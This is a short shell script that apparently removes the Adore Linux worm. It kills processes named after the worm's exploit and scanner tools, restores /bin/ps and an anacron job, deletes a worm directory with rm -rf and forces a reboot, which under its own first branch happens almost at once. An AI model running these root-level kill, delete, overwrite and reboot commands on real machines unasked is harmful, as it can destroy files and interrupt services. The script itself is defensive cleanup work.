#!/bin/sh
if [ -f /sbin/reboot ]; then
mv /usr/bin/adore /bin/ps
mv /usr/lib/lib/0anacron-bak /etc/cron.daily/0anacron
rm -rf /usr/lib/lib
/sbin/reboot
exit 0
fi
killall -9 lpd >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 lpd7.sh >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 start-lprng >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 bind >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 statdx >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 start-statd >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 start-wu26 >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 start-bind >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 pscan-bind >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 pscan-ftpd >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 pscan-lprng >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 pscan-statdx >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 wuftpd26 >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 wuscan >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 hackwu26 >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 hacklpd >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 scan.pl >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 .bla >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 xargs >>/dev/null 2>>/dev/null 3>>/dev/null
killall -9 cat >>/dev/null 2>>/dev/null 3>>/dev/null
mv /usr/bin/adore /bin/ps
mv /usr/lib/lib/0anacron-bak /etc/cron.daily/0anacron
rm -rf /usr/lib/lib
